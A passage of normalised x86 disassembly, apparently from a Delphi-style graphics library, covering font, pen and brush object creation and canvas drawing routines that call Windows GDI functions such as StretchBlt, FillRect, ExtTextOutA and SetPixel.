mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41f970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420468
mov eax [ ebp - 0x4 ]
call sub_420000
retn
sub_420480
push ebp
mov ebp esp
add esp 0xffffffb4
push ebx
xor edx edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_420609
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420610
lea eax [ ebp - 0x4c ]
mov edx 0x3
call sub_40405c
retn
mov eax [ rw-data ]
call sub_41f7c4
xor eax eax
push ebp
push sub_4205e1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41f7d0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
lea eax [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40429c
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_4088e8
lea eax [ ebp - 0x48 ]
mov edx rw-data
call sub_40429c
mov edx [ ebp - 0x48 ]
lea eax [ ebp - 0x24 ]
call sub_4088e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x19 ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a ]
mov [ ebp - 0x29 ] al
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1b
call sub_40429c
mov eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_408064
test eax eax
jne r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x26 ] 0x0
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_420764
dec al
je r-xdata
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_420628
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_4201e4
mov edx esp
mov eax ebx
call sub_42041c
add esp 0x2c
pop esi
pop ebx
retn
sub_420654
push ebx
push esi
add esp 0xffffffd4
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_420404
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_42041c
add esp 0x2c
pop esi
pop ebx
retn
sub_420694
push ebx
push esi
add esp 0xfffffed4
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x12c
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_420404
lea eax [ esp + 0xb ]
xor ecx ecx
mov edx 0x20
call sub_402cfc
lea eax [ esp + 0x2c ]
mov edx esi
mov ecx 0xff
call sub_4042d4
lea edx [ esp + 0x2c ]
lea eax [ esp + 0xb ]
mov cl 0x1f
call sub_402bec
mov edx esp
mov eax ebx
call sub_42041c
sub_42070c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_420654
pop esi
pop ebx
retn
sub_420738
push ebx
add esp 0xffffffd0
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_420404
mov al [ esp ]
mov [ esp + 0xd ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_42041c
add esp 0x30
pop ebx
retn
sub_42076c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_420404
mov [ esp + 0x8 ] bl
mov edx esp
mov eax esi
call sub_42041c
add esp 0x2c
pop esi
pop ebx
retn
sub_42079c
push ebx
push esi
add esp 0xffffffd4
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_420404
mov [ esp + 0xa ] bl
mov edx esp
mov eax esi
call sub_42041c
add esp 0x2c
pop esi
pop ebx
retn
sub_4207c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41f7dc
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_420808
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41f8c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_420830
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417b14
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41fff0
xor eax eax
push ebp
push sub_4208cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41fff0
xor eax eax
push ebp
push sub_4208b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41f9e8
mov dl [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_420a18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4208b9
mov eax [ ebp - 0x8 ]
call sub_420000
retn
sub_4208e8
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_420900
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41fff0
xor eax eax
push ebp
push sub_420945
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41f970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42094c
mov eax [ ebp - 0x4 ]
call sub_420000
retn
sub_420958
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_4208e8
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_420900
add esp 0x10
pop esi
pop ebx
retn
sub_420980
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41f7c4
xor eax eax
push ebp
push sub_420a06
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41f7d0
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1c ]
movzx eax [ eax * 2 + rw-data ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41ffac
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x14 ]
push eax
call CreatePenIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
sub_420a34
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_4208e8
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_420900
add esp 0x10
pop esi
pop ebx
retn
sub_420a64
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_4208e8
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_420900
sub_420a90
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_41f7dc
mov [ esi + 0x10 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_420ad0
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_41f8c0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_420af8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_403474
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417b14
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_41fff0
xor eax eax
push ebp
push sub_420b88
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_41fff0
xor eax eax
push ebp
push sub_420b6b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41f9e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420b72
mov eax [ ebp - 0x8 ]
call sub_420000
retn
sub_420ba0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
xor eax eax
mov [ edx + 0x8 ] eax
pop edi
pop esi
retn
sub_420bbc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_41fff0
xor eax eax
push ebp
push sub_420c01
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_41f970
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_420c08
mov eax [ ebp - 0x4 ]
call sub_420000
retn
sub_420c0c
push esi
push edi
add esp 0xfffffff0
mov esi rw-data
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp + 0x8 ] edx
mov edx esp
call sub_420bbc
add esp 0x10
pop edi
pop esi
retn
sub_420c38
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_420ba0
mov [ esp + 0x4 ] esi
cmp [ esp + 0xc ] 0x1
jne r-xdata
mov edx esp
mov eax ebx
call sub_420bbc
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0xc ] 0x0
sub_420c6c
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
call sub_41f7c4
xor edx edx
push ebp
push sub_420d39
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_41f7d0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1c ]
mov edx eax
sub dl 0x1
jb r-xdata
mov [ ebp - 0x10 ] 0x3
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x6c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ eax ]
call [ edx + 0x64 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_41ffac
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x10 ]
push eax
call CreateBrushIndirect
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x2
and eax 0x7f
sub eax 0x2
mov [ ebp - 0x8 ] eax
sub_420d54
push ebx
push esi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_420ba0
mov eax ebx
mov [ esp + 0xc ] al
cmp al 0x1
jne r-xdata
mov edx esp
mov eax esi
call sub_420bbc
add esp 0x10
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0xffffff
sub_420d88
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4032b8
lea eax [ edi + 0x38 ]
push eax
call InitializeCriticalSection
mov dl 0x1
mov eax [ r-xdata ]
call sub_420298
mov esi eax
mov [ edi + 0xc ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4216b4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4207c4
mov esi eax
mov [ edi + 0x10 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4216d4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_420a90
mov esi eax
mov [ edi + 0x14 ] esi
mov [ esi + 0xc ] edi
mov [ esi + 0x8 ] sub_4216f4
lea eax [ edi + 0x38 ]
mov [ esi + 0x14 ] eax
mov [ edi + 0x20 ] 0xcc0020
mov al [ r-xdata ]
mov [ edi + 0x8 ] al
mov edx edi
mov eax [ rw-data ]
call sub_417854
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40360c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_420e4c
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_4178f0
xor edx edx
mov eax esi
call sub_4214ec
mov eax [ esi + 0xc ]
call sub_4032e8
mov eax [ esi + 0x10 ]
call sub_4032e8
mov eax [ esi + 0x14 ]
call sub_4032e8
lea eax [ esi + 0x38 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417ae8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_420ea8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
mov dl [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_421540
mov edx [ ebx + 0x20 ]
push edx
mov edx [ edi + 0xc ]
sub edx [ edi + 0x4 ]
push edx
mov edx [ edi + 0x8 ]
sub edx [ edi ]
push edx
mov edx [ edi + 0x4 ]
push edx
mov edx [ edi ]
push edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
push edx
mov edx [ esi + 0xc ]
sub edx [ esi + 0x4 ]
push edx
mov edx [ esi + 0x8 ]
mov eax [ esi ]
sub edx eax
push edx
mov edx [ esi + 0x4 ]
push edx
push eax
mov eax [ ebx + 0x4 ]
push eax
call StretchBlt
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_420f30
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
mov eax [ ebx + 0x14 ]
call sub_420c30
call sub_41ffac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41ffac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
add eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
add ecx edi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_41613c
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_420fdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
push esi
mov eax [ ebx + 0x4 ]
push eax
call DrawFocusRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_421010
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
mov eax [ ebx + 0x14 ]
call sub_420c6c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FillRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_42104c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
mov eax [ ebx + 0x14 ]
call sub_420c6c
push eax
push esi
mov eax [ ebx + 0x4 ]
push eax
call FrameRect
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop esi
pop ebx
retn
sub_421088
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call LineTo
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_4210e8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
push 0x0
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call MoveToEx
pop edi
pop esi
pop ebx
retn
sub_421114
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
inc edi
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Polyline
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
retn
sub_42114c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call Rectangle
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_421194
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
mov ecx edi
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi + 0x14 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
sub_4211d0
push ebx
push esi
add esp 0xfffffff8
mov esi eax
xor ebx ebx
test [ esi + 0x54 ] 0x80
je r-xdata
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
push esp
mov eax esi
call sub_42146c
push eax
call GetWindowOrgEx
cmp [ esp ] 0x0
je r-xdata
mov bl 0x1
sub_4211fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
mov eax ebx
call sub_4211d0
cmp al 0x1
jne r-xdata
push 0x0
mov eax esi
call sub_4042f8
push eax
mov eax esi
call sub_4044f8
push eax
push 0x0
mov eax [ ebx + 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
mov eax [ ebx + 0x4 ]
push eax
call ExtTextOutA
mov edx esi
mov eax ebx
call sub_4212cc
mov edx eax
add edx edi
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4210e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov edx esi
mov eax ebx
call sub_4212cc
inc eax
add edi eax
sub_421288
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
xor eax eax
mov [ esi ] eax
xor eax eax
mov [ esi + 0x4 ] eax
push esi
mov eax edi
call sub_4042f8
push eax
mov eax edi
call sub_4044f8
push eax
mov eax [ ebx + 0x4 ]
push eax
call GetTextExtentPoint32A
pop edi
pop esi
pop ebx
retn
sub_4212cc
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_421288
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4212e8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
call sub_421288
mov eax [ esp + 0x4 ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_421308
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_421354
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x50 ] 0x0
sete [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42135b
push rw-data
call LeaveCriticalSection
retn
mov eax ebx
call sub_4210c0
sub_4213b4
push ebx
push esi
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetCurrentPositionEx
pop esi
pop ebx
retn
sub_4213d8
push esi
push edi
add esp 0xfffffff8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
call sub_4210e8
pop ecx
pop edx
pop edi
pop esi
retn
sub_4213f8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call GetPixel
pop edi
pop esi
pop ebx
retn
sub_421424
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov dl [ r-xdata ]
mov eax ebx
call sub_421540
mov eax [ ebp + 0x8 ]
call sub_41ffac
push eax
push edi
push esi
mov eax [ ebx + 0x4 ]
push eax
call SetPixel
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_42148c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov dl [ ebx + 0x8 ]
cmp dl al
je r-xdata
mov eax [ rw-data ]
push eax
push esi
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov al [ r-xdata ]
not eax
and al [ ebx + 0x8 ]
mov [ ebx + 0x8 ] al
sub_4214ec
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
cmp esi eax
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov eax ebx
call sub_42148c
mov edx esp
mov eax ebx
call sub_4213b4
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfe
or [ ebx + 0x8 ] 0x1
mov [ ebx + 0x4 ] esi
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_4213d8
sub_421540
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
mov bl [ esi + 0x8 ]
not ebx
and bl [ esp ]
mov al [ r-xdata ]
cmp al bl
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl 0x1
je r-xdata
test bl 0x2
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x14 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl 0x4
je r-xdata
mov eax esi
call sub_4215dc
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
test bl 0x8
je r-xdata
mov eax esi
call sub_421608
or bl [ esi + 0x8 ]
mov [ esi + 0x8 ] bl
mov eax esi
call sub_421638
sub_4215dc
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_420480
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0xc ]
mov eax [ eax + 0x18 ]
call sub_41ffac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
pop ebx
retn
sub_421608
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_420980
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x10 ]
movzx eax [ eax + 0x18 ]
movzx eax [ eax * 2 + rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetROP2
pop ebx
retn
sub_421638
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
call sub_420c6c
push eax
call UnrealizeObject
mov eax [ ebx + 0x14 ]
call sub_420c6c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
mov eax [ ebx + 0x14 ]
call sub_420d4c
test al al
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_420c30
call sub_41ffac
not eax
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_420c30
call sub_41ffac
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_421768
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_4217b2
